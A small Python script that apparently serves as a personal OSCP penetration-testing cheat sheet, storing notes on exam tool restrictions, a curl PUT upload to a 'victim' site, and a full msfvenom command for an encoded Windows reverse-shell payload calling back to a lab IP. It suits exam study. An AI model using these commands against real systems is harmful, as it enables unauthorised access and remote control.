#!/usr/bin/env python3

'''Allows requesting of information - Knowledge Base. Can either get direct knowledge by name, or pass "list" to be told what's there.'''

#TODO: Add function "help" to show all possible knowledge[*] entries

class KnowledgeBase:
	knowledge = {
	"nmap":"Nmap is used *this way* hehe."

	,"exam_illegal_tools":"metasploit (excludes msfvenom, meterpreter, exploit/multi/handler) - ONLY USAGE ON ONE HOST for Auxilliary, Exploit and Post modules. ;\
	Auto Exploitation tools (SQLmap etc) Mass Vuln Scanners (nikto, nessus, OpenVas etc). No spoofing,"

	,"exam_formats":"https://support.offensive-security.com/#!oscp-exam-guide.md"

	,"PUTtoWebServer":'curl -X PUT -d "text or data to put" http://www.victim.com/destination_page"'

	,"msfvenom_payload":r"""msfvenom -p windows/shell/reverse_tcp LHOST=10.11.0.135 LPORT=443 -f <[c,python,shell]> -a x86 --platform windows -b "\x00\x0a\x0d\x20" -e x86/shikata_ga_nai > exploits/66_payload135"""

	}

	def showKnowledgeOn(topic):
		'''Gets anything requested from the Dictionary "knowledge". Alternatively can show the entire knowledgeBase by passing "list"'''
		if (topic == "list"):
			print("TOPICS:")
			for key in KnowledgeBase.knowledge.keys():
				print(">> " + key)
		else:
			fetchedKnowledge = KnowledgeBase.knowledge.get(topic)
			print(">>> Knowledge for " + topic + " <<<")
			print(fetchedKnowledge)